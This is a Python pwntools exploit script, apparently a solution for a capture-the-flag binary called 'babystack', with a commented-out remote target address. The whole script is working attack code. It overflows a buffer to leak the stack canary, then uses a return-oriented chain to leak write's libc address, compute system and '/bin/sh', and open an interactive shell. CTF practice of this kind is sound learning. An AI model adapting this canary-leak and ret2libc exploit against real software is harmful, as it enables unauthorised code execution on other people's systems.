from pwn import *

p = process('babystack')
#p = remote('111.198.29.45',42504)
elf = ELF('babystack')
libc = ELF('libc-2.23.so')

write_got=elf.got['write']
write_plt=elf.symbols['write']
puts_addr=elf.plt['puts']
pop_rid=0x400a93
main_addr=0x400908
ppp_addr=0x400a8a


print "write_got:"+hex(write_got)

def store(content):
    p.send('1')
    p.send(content)
    p.recv()

def show():
    p.sendline("2")
    data=p.recvuntil('\n----',drop=True)
    return data

p.recv()
payload1=0x88*'a'+'a'
store(payload1)
data = show().replace(payload1[:-1],'')[:8]
canary = u64(data) & 0xffffffffffffff00
print hex(canary)

p.recv()

payload2 = 0x88*'a'+p64(canary)+p64(0)+p64(pop_rid)+p64(write_got)+p64(puts_addr)+p64(main_addr)



store(payload2)

p.sendline('3')

write_addr=u64(p.recv(6).ljust(8,'\x00'))


system_addr=write_addr-libc.symbols['write']+libc.symbols['system']
binsh_addr=write_addr-libc.symbols['write']+next(libc.search('/bin/sh'))

print "system_addr:"+hex(system_addr)
print "binsh_addr:"+hex(binsh_addr)

payload3 = 0x88*'a'+p64(canary)+p64(0)+p64(pop_rid)+p64(binsh_addr)+p64(system_addr)+p64(main_addr)

p.recv()
store(payload3)


p.sendline("3")
p.interactive()